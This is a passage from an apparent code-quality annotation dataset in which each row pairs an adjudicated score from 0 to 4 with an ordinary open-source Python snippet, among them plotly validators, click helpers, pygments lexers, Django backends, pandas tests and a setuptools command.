            ""._bordercolor.BordercolorValidator"",
            ""._bgcolor.BgcolorValidator"",
            ""._active.ActiveValidator"",
        ],
    )"
258	adjudicated	2	"import re
import textwrap
import email.message

from ._text import FoldedCase


class Message(email.message.Message):
    multiple_use_keys = set(
        map(
            FoldedCase,
            [
                'Classifier',
                'Obsoletes-Dist',
                'Platform',
                'Project-URL',
                'Provides-Dist',
                'Provides-Extra',
                'Requires-Dist',
                'Requires-External',
                'Supported-Platform',
                'Dynamic',
            ],
        )
    )
    """"""
    Keys that may be indicated multiple times per PEP 566.
    """"""

    def __new__(cls, orig: email.message.Message):
        res = super().__new__(cls)
        vars(res).update(vars(orig))
        return res

    def __init__(self, *args, **kwargs):
        self._headers = self._repair_headers()

    # suppress spurious error from mypy
    def __iter__(self):
        return super().__iter__()

    def _repair_headers(self):
        def redent(value):
            ""Correct for RFC822 indentation""
            if not value or '\n' not in value:
                return value
            return textwrap.dedent(' ' * 8 + value)

        headers = [(key, redent(value)) for key, value in vars(self)['_headers']]
        if self._payload:
            headers.append(('Description', self.get_payload()))
        return headers

    @property
    def json(self):
        """"""
        Convert PackageMetadata to a JSON-compatible format
        per PEP 0566.
        """"""

        def transform(key):
            value = self.get_all(key) if key in self.multiple_use_keys else self[key]
            if key == 'Keywords':
                value = re.split(r'\s+', value)
            tk = key.lower().replace('-', '_')
            return tk, value

        return dict(map(transform, map(FoldedCase, self)))"
349	adjudicated	3	"import typing as t
from threading import local

if t.TYPE_CHECKING:
    import typing_extensions as te
    from .core import Context

_local = local()


@t.overload
def get_current_context(silent: ""te.Literal[False]"" = False) -> ""Context"":
    ...


@t.overload
def get_current_context(silent: bool = ...) -> t.Optional[""Context""]:
    ...


def get_current_context(silent: bool = False) -> t.Optional[""Context""]:
    """"""Returns the current click context.  This can be used as a way to
    access the current context object from anywhere.  This is a more implicit
    alternative to the :func:`pass_context` decorator.  This function is
    primarily useful for helpers such as :func:`echo` which might be
    interested in changing its behavior based on the current context.

    To push the current context, :meth:`Context.scope` can be used.

    .. versionadded:: 5.0

    :param silent: if set to `True` the return value is `None` if no context
                   is available.  The default behavior is to raise a
                   :exc:`RuntimeError`.
    """"""
    try:
        return t.cast(""Context"", _local.stack[-1])
    except (AttributeError, IndexError) as e:
        if not silent:
            raise RuntimeError(""There is no active click context."") from e

    return None


def push_context(ctx: ""Context"") -> None:
    """"""Pushes a new context to the current stack.""""""
    _local.__dict__.setdefault(""stack"", []).append(ctx)


def pop_context() -> None:
    """"""Removes the top level from the stack.""""""
    _local.stack.pop()


def resolve_color_default(color: t.Optional[bool] = None) -> t.Optional[bool]:
    """"""Internal helper to get the default value of the color flag.  If a
    value is passed it's returned unchanged, otherwise it's looked up from
    the current context.
    """"""
    if color is not None:
        return color

    ctx = get_current_context(silent=True)

    if ctx is not None:
        return ctx.color

    return None"
209	adjudicated	0	"# (Â©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

from bot import Bot
from config import OWNER
from Data import Data
from pyrogram import filters
from pyrogram.errors import MessageNotModified
from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, Message


@Bot.on_message(filters.private & filters.incoming & filters.command(""about""))
async def _about(client: Bot, msg: Message):
    await client.send_message(
        msg.chat.id,
        Data.ABOUT.format(client.username, OWNER),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(Data.mbuttons),
    )


@Bot.on_message(filters.private & filters.incoming & filters.command(""help""))
async def _help(client: Bot, msg: Message):
    await client.send_message(
        msg.chat.id,
        ""<b>Cara Menggunakan Bot ini</b>\n"" + Data.HELP,
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(Data.buttons),
    )


@Bot.on_callback_query()
async def cb_handler(client: Bot, query: CallbackQuery):
    data = query.data
    if data == ""about"":
        try:
            await query.message.edit_text(
                text=Data.ABOUT.format(client.username, OWNER),
                disable_web_page_preview=True,
                reply_markup=InlineKeyboardMarkup(Data.mbuttons),
            )
        except MessageNotModified:
            pass
    elif data == ""help"":
        try:
            await query.message.edit_text(
                text=""<b>Cara Menggunakan Bot ini</b>\n"" + Data.HELP,
                disable_web_page_preview=True,
                reply_markup=InlineKeyboardMarkup(Data.buttons),
            )
        except MessageNotModified:
            pass
    elif data == ""close"":
        await query.message.delete()
        try:
            await query.message.reply_to_message.delete()
        except BaseException:
            pass"
198	adjudicated	3	"""""""
    pygments.lexers.roboconf
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Roboconf DSL.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, words, re
from pygments.token import Text, Operator, Keyword, Name, Comment

__all__ = ['RoboconfGraphLexer', 'RoboconfInstancesLexer']


class RoboconfGraphLexer(RegexLexer):
    """"""
    Lexer for Roboconf graph files.

    .. versionadded:: 2.1
    """"""
    name = 'Roboconf Graph'
    aliases = ['roboconf-graph']
    filenames = ['*.graph']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [
            # Skip white spaces
            (r'\s+', Text),

            # There is one operator
            (r'=', Operator),

            # Keywords
            (words(('facet', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words((
                'installer', 'extends', 'exports', 'imports', 'facets',
                'children'), suffix=r'\s*:?', prefix=r'\b'), Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }


class RoboconfInstancesLexer(RegexLexer):
    """"""
    Lexer for Roboconf instances files.

    .. versionadded:: 2.1
    """"""
    name = 'Roboconf Instances'
    aliases = ['roboconf-instances']
    filenames = ['*.instances']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [

            # Skip white spaces
            (r'\s+', Text),

            # Keywords
            (words(('instance of', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words(('name', 'count'), suffix=r's*:?', prefix=r'\b'), Name),
            (r'\s*[\w.-]+\s*:', Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }"
456	adjudicated	0	"import json

from .oauth import OAuth2Test


class GiteaOAuth2Test(OAuth2Test):
    backend_path = 'social_core.backends.gitea.GiteaOAuth2'
    user_data_url = 'https://gitea.com/api/v1/user'
    expected_username = 'foobar'
    access_token_body = json.dumps({
        'access_token': 'foobar',
        'token_type': 'bearer',
        'expires_in': 7200,
        'refresh_token': 'barfoo'
    })
    user_data_body = json.dumps({
        'id': 123456,
        'login': 'foobar',
        'full_name': 'Foo Bar',
        'email': 'foobar@example.com',
        'avatar_url': 'https://gitea.com/user/avatar/foobar/-1',
        'language': 'en-US',
        'is_admin': False,
        'last_login': '2016-12-28T12:26:19+01:00',
        'created': '2016-12-28T12:26:19+01:00',
        'restricted': False,
        'username': 'foobar'
    })

    def test_login(self):
        self.do_login()

    def test_partial_pipeline(self):
        self.do_partial_pipeline()


class GiteaCustomDomainOAuth2Test(OAuth2Test):
    backend_path = 'social_core.backends.gitea.GiteaOAuth2'
    user_data_url = 'https://example.com/api/v1/user'
    expected_username = 'foobar'
    access_token_body = json.dumps({
        'access_token': 'foobar',
        'token_type': 'bearer',
        'expires_in': 7200,
        'refresh_token': 'barfoo'
    })
    user_data_body = json.dumps({
        'id': 123456,
        'login': 'foobar',
        'full_name': 'Foo Bar',
        'email': 'foobar@example.com',
        'avatar_url': 'https://example.com/user/avatar/foobar/-1',
        'language': 'en-US',
        'is_admin': False,
        'last_login': '2016-12-28T12:26:19+01:00',
        'created': '2016-12-28T12:26:19+01:00',
        'restricted': False,
        'username': 'foobar'
    })

    def test_login(self):
        self.strategy.set_settings({
            'SOCIAL_AUTH_GITEA_API_URL': 'https://example.com'
        })
        self.do_login()

    def test_partial_pipeline(self):
        self.strategy.set_settings({
            'SOCIAL_AUTH_GITEA_API_URL': 'https://example.com'
        })
        self.do_partial_pipeline()"
462	adjudicated	2	"""""""
Dummy database backend for Django.

Django uses this if the database ENGINE setting is empty (None or empty string).

Each of these API functions, except connection.close(), raise
ImproperlyConfigured.
""""""

from django.core.exceptions import ImproperlyConfigured
from django.db.backends.base.base import BaseDatabaseWrapper
from django.db.backends.base.client import BaseDatabaseClient
from django.db.backends.base.creation import BaseDatabaseCreation
from django.db.backends.base.introspection import BaseDatabaseIntrospection
from django.db.backends.base.operations import BaseDatabaseOperations
from django.db.backends.dummy.features import DummyDatabaseFeatures


def complain(*args, **kwargs):
    raise ImproperlyConfigured(
        ""settings.DATABASES is improperly configured. ""
        ""Please supply the ENGINE value. Check ""
        ""settings documentation for more details.""
    )


def ignore(*args, **kwargs):
    pass


class DatabaseOperations(BaseDatabaseOperations):
    quote_name = complain


class DatabaseClient(BaseDatabaseClient):
    runshell = complain


class DatabaseCreation(BaseDatabaseCreation):
    create_test_db = ignore
    destroy_test_db = ignore


class DatabaseIntrospection(BaseDatabaseIntrospection):
    get_table_list = complain
    get_table_description = complain
    get_relations = complain
    get_indexes = complain


class DatabaseWrapper(BaseDatabaseWrapper):
    operators = {}
    # Override the base class implementations with null
    # implementations. Anything that tries to actually
    # do something raises complain; anything that tries
    # to rollback or undo something raises ignore.
    _cursor = complain
    ensure_connection = complain
    _commit = complain
    _rollback = ignore
    _close = ignore
    _savepoint = ignore
    _savepoint_commit = complain
    _savepoint_rollback = ignore
    _set_autocommit = complain
    # Classes instantiated in __init__().
    client_class = DatabaseClient
    creation_class = DatabaseCreation
    features_class = DummyDatabaseFeatures
    introspection_class = DatabaseIntrospection
    ops_class = DatabaseOperations

    def is_usable(self):
        return True"
433	adjudicated	2	"# Copyright 2016 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import typing


# sys.maxsize:
# An integer giving the maximum value a variable of type Py_ssize_t can take.
MAX_WAIT = sys.maxsize / 2


def find_ordinal(pos_num: int) -> str:
    # See: https://en.wikipedia.org/wiki/English_numerals#Ordinal_numbers
    if pos_num == 0:
        return ""th""
    elif pos_num == 1:
        return ""st""
    elif pos_num == 2:
        return ""nd""
    elif pos_num == 3:
        return ""rd""
    elif 4 <= pos_num <= 20:
        return ""th""
    else:
        return find_ordinal(pos_num % 10)


def to_ordinal(pos_num: int) -> str:
    return f""{pos_num}{find_ordinal(pos_num)}""


def get_callback_name(cb: typing.Callable[..., typing.Any]) -> str:
    """"""Get a callback fully-qualified name.

    If no name can be produced ``repr(cb)`` is called and returned.
    """"""
    segments = []
    try:
        segments.append(cb.__qualname__)
    except AttributeError:
        try:
            segments.append(cb.__name__)
        except AttributeError:
            pass
    if not segments:
        return repr(cb)
    else:
        try:
            # When running under sphinx it appears this can be none?
            if cb.__module__:
                segments.insert(0, cb.__module__)
        except AttributeError:
            pass
        return ""."".join(segments)"
491	adjudicated	3	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# [START automl_video_classification_list_datasets_beta]
# [START automl_video_object_tracking_list_datasets_beta]
from google.cloud import automl_v1beta1 as automl


def list_datasets(project_id=""YOUR_PROJECT_ID""):
    """"""List datasets.""""""
    client = automl.AutoMlClient()
    # A resource that represents Google Cloud Platform location.
    project_location = f""projects/{project_id}/locations/us-central1""

    # List all the datasets available in the region.
    request = automl.ListDatasetsRequest(parent=project_location, filter="""")
    response = client.list_datasets(request=request)

    print(""List of datasets:"")
    for dataset in response:
        print(""Dataset name: {}"".format(dataset.name))
        print(""Dataset id: {}"".format(dataset.name.split(""/"")[-1]))
        print(""Dataset display name: {}"".format(dataset.display_name))
        print(""Dataset create time: {}"".format(dataset.create_time))
        # [END automl_video_object_tracking_list_datasets_beta]

        print(
            ""Video classification dataset metadata: {}"".format(
                dataset.video_classification_dataset_metadata
            )
        )
        # [END automl_video_classification_list_datasets_beta]

        # [START automl_video_object_tracking_list_datasets_beta]
        print(
            ""Video object tracking dataset metadata: {}"".format(
                dataset.video_object_tracking_dataset_metadata
            )
        )
        # [END automl_video_object_tracking_list_datasets_beta]"
413	adjudicated	2	"# -*- coding: utf-8 -*-
""""""
set_fake_passwords.py

    Reset all user passwords to a common value. Useful for testing in a
    development environment. As such, this command is only available when
    setting.DEBUG is True.

""""""
from typing import List

from django.conf import settings
from django.contrib.auth import get_user_model
from django.core.management.base import BaseCommand, CommandError

from django_extensions.management.utils import signalcommand

DEFAULT_FAKE_PASSWORD = 'password'


class Command(BaseCommand):
    help = 'DEBUG only: sets all user passwords to a common value (""%s"" by default)' % (DEFAULT_FAKE_PASSWORD, )
    requires_system_checks: List[str] = []

    def add_arguments(self, parser):
        super().add_arguments(parser)
        parser.add_argument(
            '--prompt', dest='prompt_passwd', default=False,
            action='store_true',
            help='Prompts for the new password to apply to all users'
        )
        parser.add_argument(
            '--password', dest='default_passwd', default=DEFAULT_FAKE_PASSWORD,
            help='Use this as default password.'
        )

    @signalcommand
    def handle(self, *args, **options):
        if not settings.DEBUG:
            raise CommandError('Only available in debug mode')

        if options['prompt_passwd']:
            from getpass import getpass
            passwd = getpass('Password: ')
            if not passwd:
                raise CommandError('You must enter a valid password')
        else:
            passwd = options['default_passwd']

        User = get_user_model()
        user = User()
        user.set_password(passwd)
        count = User.objects.all().update(password=user.password)

        print('Reset %d passwords' % count)"
502	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""histogram2d"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
442	adjudicated	0	"import pytest

from pandas.util._decorators import deprecate_kwarg

import pandas._testing as tm


@deprecate_kwarg(""old"", ""new"")
def _f1(new=False):
    return new


_f2_mappings = {""yes"": True, ""no"": False}


@deprecate_kwarg(""old"", ""new"", _f2_mappings)
def _f2(new=False):
    return new


def _f3_mapping(x):
    return x + 1


@deprecate_kwarg(""old"", ""new"", _f3_mapping)
def _f3(new=0):
    return new


@pytest.mark.parametrize(""key,klass"", [(""old"", FutureWarning), (""new"", None)])
def test_deprecate_kwarg(key, klass):
    x = 78

    with tm.assert_produces_warning(klass):
        assert _f1(**{key: x}) == x


@pytest.mark.parametrize(""key"", list(_f2_mappings.keys()))
def test_dict_deprecate_kwarg(key):
    with tm.assert_produces_warning(FutureWarning):
        assert _f2(old=key) == _f2_mappings[key]


@pytest.mark.parametrize(""key"", [""bogus"", 12345, -1.23])
def test_missing_deprecate_kwarg(key):
    with tm.assert_produces_warning(FutureWarning):
        assert _f2(old=key) == key


@pytest.mark.parametrize(""x"", [1, -1.4, 0])
def test_callable_deprecate_kwarg(x):
    with tm.assert_produces_warning(FutureWarning):
        assert _f3(old=x) == _f3_mapping(x)


def test_callable_deprecate_kwarg_fail():
    msg = ""((can only|cannot) concatenate)|(must be str)|(Can't convert)""

    with pytest.raises(TypeError, match=msg):
        _f3(old=""hello"")


def test_bad_deprecate_kwarg():
    msg = ""mapping from old to new argument values must be dict or callable!""

    with pytest.raises(TypeError, match=msg):

        @deprecate_kwarg(""old"", ""new"", 0)
        def f4(new=None):
            return new


@deprecate_kwarg(""old"", None)
def _f4(old=True, unchanged=True):
    return old, unchanged


@pytest.mark.parametrize(""key"", [""old"", ""unchanged""])
def test_deprecate_keyword(key):
    x = 9

    if key == ""old"":
        klass = FutureWarning
        expected = (x, True)
    else:
        klass = None
        expected = (True, x)

    with tm.assert_produces_warning(klass):
        assert _f4(**{key: x}) == expected"
485	adjudicated	4	"""""""
NGP VAN's `ActionID` Provider

http://developers.ngpvan.com/action-id
""""""
from openid.extensions import ax

from .open_id import OpenIdAuth


class ActionIDOpenID(OpenIdAuth):
    """"""
    NGP VAN's ActionID OpenID 1.1 authentication backend
    """"""
    name = 'actionid-openid'
    URL = 'https://accounts.ngpvan.com/Home/Xrds'
    USERNAME_KEY = 'email'

    def get_ax_attributes(self):
        """"""
        Return the AX attributes that ActionID responds with, as well as the
        user data result that it must map to.
        """"""
        return [
            ('http://openid.net/schema/contact/internet/email', 'email'),
            ('http://openid.net/schema/contact/phone/business', 'phone'),
            ('http://openid.net/schema/namePerson/first', 'first_name'),
            ('http://openid.net/schema/namePerson/last', 'last_name'),
            ('http://openid.net/schema/namePerson', 'fullname'),
        ]

    def setup_request(self, params=None):
        """"""
        Setup the OpenID request

        Because ActionID does not advertise the availiability of AX attributes
        nor use standard attribute aliases, we need to setup the attributes
        manually instead of rely on the parent OpenIdAuth.setup_request()
        """"""
        request = self.openid_request(params)

        fetch_request = ax.FetchRequest()
        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/contact/internet/email',
            alias='ngpvanemail',
            required=True
        ))

        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/contact/phone/business',
            alias='ngpvanphone',
            required=False
        ))
        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/namePerson/first',
            alias='ngpvanfirstname',
            required=False
        ))
        fetch_request.add(ax.AttrInfo(
            'http://openid.net/schema/namePerson/last',
            alias='ngpvanlastname',
            required=False
        ))
        request.addExtension(fetch_request)

        return request"
476	adjudicated	1	"import pytest

from pandas.util._validators import validate_args

_fname = ""func""


def test_bad_min_fname_arg_count():
    msg = ""'max_fname_arg_count' must be non-negative""

    with pytest.raises(ValueError, match=msg):
        validate_args(_fname, (None,), -1, ""foo"")


def test_bad_arg_length_max_value_single():
    args = (None, None)
    compat_args = (""foo"",)

    min_fname_arg_count = 0
    max_length = len(compat_args) + min_fname_arg_count
    actual_length = len(args) + min_fname_arg_count
    msg = (
        rf""{_fname}\(\) takes at most {max_length} ""
        rf""argument \({actual_length} given\)""
    )

    with pytest.raises(TypeError, match=msg):
        validate_args(_fname, args, min_fname_arg_count, compat_args)


def test_bad_arg_length_max_value_multiple():
    args = (None, None)
    compat_args = {""foo"": None}

    min_fname_arg_count = 2
    max_length = len(compat_args) + min_fname_arg_count
    actual_length = len(args) + min_fname_arg_count
    msg = (
        rf""{_fname}\(\) takes at most {max_length} ""
        rf""arguments \({actual_length} given\)""
    )

    with pytest.raises(TypeError, match=msg):
        validate_args(_fname, args, min_fname_arg_count, compat_args)


@pytest.mark.parametrize(""i"", range(1, 3))
def test_not_all_defaults(i):
    bad_arg = ""foo""
    msg = (
        f""the '{bad_arg}' parameter is not supported ""
        rf""in the pandas implementation of {_fname}\(\)""
    )

    compat_args = {""foo"": 2, ""bar"": -1, ""baz"": 3}
    arg_vals = (1, -1, 3)

    with pytest.raises(ValueError, match=msg):
        validate_args(_fname, arg_vals[:i], 2, compat_args)


def test_validation():
    # No exceptions should be raised.
    validate_args(_fname, (None,), 2, {""out"": None})

    compat_args = {""axis"": 1, ""out"": None}
    validate_args(_fname, (1, None), 2, compat_args)"
427	adjudicated	2	"""""""
 The GeometryColumns and SpatialRefSys models for the PostGIS backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class PostGISGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' view from PostGIS. See the PostGIS
    documentation at Ch. 4.3.2.
    """"""

    f_table_catalog = models.CharField(max_length=256)
    f_table_schema = models.CharField(max_length=256)
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    type = models.CharField(max_length=30)

    class Meta:
        app_label = ""gis""
        db_table = ""geometry_columns""
        managed = False

    def __str__(self):
        return ""%s.%s - %dD %s field (SRID: %d)"" % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""f_table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""f_geometry_column""


class PostGISSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from PostGIS. See the PostGIS
    documentation at Ch. 4.2.1.
    """"""

    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    srtext = models.CharField(max_length=2048)
    proj4text = models.CharField(max_length=2048)

    class Meta:
        app_label = ""gis""
        db_table = ""spatial_ref_sys""
        managed = False

    @property
    def wkt(self):
        return self.srtext"
369	adjudicated	3	"""""""
    pygments.filter
    ~~~~~~~~~~~~~~~

    Module that implements the default filter.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""


def apply_filters(stream, filters, lexer=None):
    """"""
    Use this method to apply an iterable of filters to
    a stream. If lexer is given it's forwarded to the
    filter, otherwise the filter receives `None`.
    """"""
    def _apply(filter_, stream):
        yield from filter_.filter(lexer, stream)
    for filter_ in filters:
        stream = _apply(filter_, stream)
    return stream


def simplefilter(f):
    """"""
    Decorator that converts a function into a filter::

        @simplefilter
        def lowercase(self, lexer, stream, options):
            for ttype, value in stream:
                yield ttype, value.lower()
    """"""
    return type(f.__name__, (FunctionFilter,), {
        '__module__': getattr(f, '__module__'),
        '__doc__': f.__doc__,
        'function': f,
    })


class Filter:
    """"""
    Default filter. Subclass this class or use the `simplefilter`
    decorator to create own filters.
    """"""

    def __init__(self, **options):
        self.options = options

    def filter(self, lexer, stream):
        raise NotImplementedError()


class FunctionFilter(Filter):
    """"""
    Abstract class used by `simplefilter` to create simple
    function filters on the fly. The `simplefilter` decorator
    automatically creates subclasses of this class for
    functions passed to it.
    """"""
    function = None

    def __init__(self, **options):
        if not hasattr(self, 'function'):
            raise TypeError('%r used without bound function' %
                            self.__class__.__name__)
        Filter.__init__(self, **options)

    def filter(self, lexer, stream):
        # pylint: disable=not-callable
        yield from self.function(lexer, stream, self.options)"
229	adjudicated	0	"# Licensed to the Software Freedom Conservancy (SFC) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The SFC licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from .firefox.webdriver import WebDriver as Firefox  # noqa
from .firefox.firefox_profile import FirefoxProfile  # noqa
from .firefox.options import Options as FirefoxOptions  # noqa
from .chrome.webdriver import WebDriver as Chrome  # noqa
from .chrome.options import Options as ChromeOptions  # noqa
from .ie.webdriver import WebDriver as Ie  # noqa
from .ie.options import Options as IeOptions  # noqa
from .edge.webdriver import WebDriver as Edge  # noqa
from .opera.webdriver import WebDriver as Opera  # noqa
from .safari.webdriver import WebDriver as Safari  # noqa
from .blackberry.webdriver import WebDriver as BlackBerry  # noqa
from .phantomjs.webdriver import WebDriver as PhantomJS  # noqa
from .android.webdriver import WebDriver as Android  # noqa
from .webkitgtk.webdriver import WebDriver as WebKitGTK # noqa
from .webkitgtk.options import Options as WebKitGTKOptions # noqa
from .remote.webdriver import WebDriver as Remote  # noqa
from .common.desired_capabilities import DesiredCapabilities  # noqa
from .common.action_chains import ActionChains  # noqa
from .common.touch_actions import TouchActions  # noqa
from .common.proxy import Proxy  # noqa

__version__ = '3.14.1'"
338	adjudicated	2	""""""" Test functions for linalg module using the matrix class.""""""
import numpy as np

from numpy.linalg.tests.test_linalg import (
    LinalgCase, apply_tag, TestQR as _TestQR, LinalgTestCase,
    _TestNorm2D, _TestNormDoubleBase, _TestNormSingleBase, _TestNormInt64Base,
    SolveCases, InvCases, EigvalsCases, EigCases, SVDCases, CondCases,
    PinvCases, DetCases, LstsqCases)


CASES = []

# square test cases
CASES += apply_tag('square', [
    LinalgCase(""0x0_matrix"",
               np.empty((0, 0), dtype=np.double).view(np.matrix),
               np.empty((0, 1), dtype=np.double).view(np.matrix),
               tags={'size-0'}),
    LinalgCase(""matrix_b_only"",
               np.array([[1., 2.], [3., 4.]]),
               np.matrix([2., 1.]).T),
    LinalgCase(""matrix_a_and_b"",
               np.matrix([[1., 2.], [3., 4.]]),
               np.matrix([2., 1.]).T),
])

# hermitian test-cases
CASES += apply_tag('hermitian', [
    LinalgCase(""hmatrix_a_and_b"",
               np.matrix([[1., 2.], [2., 1.]]),
               None),
])
# No need to make generalized or strided cases for matrices.


class MatrixTestCase(LinalgTestCase):
    TEST_CASES = CASES


class TestSolveMatrix(SolveCases, MatrixTestCase):
    pass


class TestInvMatrix(InvCases, MatrixTestCase):
    pass


class TestEigvalsMatrix(EigvalsCases, MatrixTestCase):
    pass


class TestEigMatrix(EigCases, MatrixTestCase):
    pass


class TestSVDMatrix(SVDCases, MatrixTestCase):
    pass


class TestCondMatrix(CondCases, MatrixTestCase):
    pass


class TestPinvMatrix(PinvCases, MatrixTestCase):
    pass


class TestDetMatrix(DetCases, MatrixTestCase):
    pass


class TestLstsqMatrix(LstsqCases, MatrixTestCase):
    pass


class _TestNorm2DMatrix(_TestNorm2D):
    array = np.matrix


class TestNormDoubleMatrix(_TestNorm2DMatrix, _TestNormDoubleBase):
    pass


class TestNormSingleMatrix(_TestNorm2DMatrix, _TestNormSingleBase):
    pass


class TestNormInt64Matrix(_TestNorm2DMatrix, _TestNormInt64Base):
    pass


class TestQRMatrix(_TestQR):
    array = np.matrix"
278	adjudicated	0	"# Copyright (c) 2020, Oracle and/or its affiliates.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License, version 2.0, as
# published by the Free Software Foundation.
#
# This program is also distributed with certain software (including
# but not limited to OpenSSL) that is licensed under separate terms,
# as designated in a particular file or component or in included license
# documentation.  The authors of MySQL hereby grant you an
# additional permission to link the program and your derivative works
# with the separately licensed software that they have included with
# MySQL.
#
# Without limiting anything contained in the foregoing, this file,
# which is part of MySQL Connector/Python, is also subject to the
# Universal FOSS Exception, version 1.0, a copy of which can be found at
# http://oss.oracle.com/licenses/universal-foss-exception.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License, version 2.0, for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA

from django.db.backends.mysql.features import DatabaseFeatures as MySQLDatabaseFeatures
from django.utils.functional import cached_property


class DatabaseFeatures(MySQLDatabaseFeatures):
    empty_fetchmany_value = []

    @cached_property
    def can_introspect_check_constraints(self):
        return self.connection.mysql_version >= (8, 0, 16)

    @cached_property
    def supports_microsecond_precision(self):
        if self.connection.mysql_version >= (5, 6, 3):
            return True
        return False"
268	adjudicated	1	"from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools.extern import six

from setuptools import Command


class rotate(Command):
    """"""Delete older distributions""""""

    description = ""delete older distributions, keeping N newest files""
    user_options = [
        ('match=', 'm', ""patterns to match (required)""),
        ('dist-dir=', 'd', ""directory where the distributions are""),
        ('keep=', 'k', ""number of matching distributions to keep""),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                ""Must specify one or more (comma-separated) match patterns ""
                ""(e.g. '.zip' or '.egg')""
            )
        if self.keep is None:
            raise DistutilsOptionError(""Must specify number of files to keep"")
        try:
            self.keep = int(self.keep)
        except ValueError:
            raise DistutilsOptionError(""--keep must be an integer"")
        if isinstance(self.match, six.string_types):
            self.match = [
                convert_path(p.strip()) for p in self.match.split(',')
            ]
        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))

    def run(self):
        self.run_command(""egg_info"")
        from glob import glob

        for pattern in self.match:
            pattern = self.distribution.get_name() + '*' + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
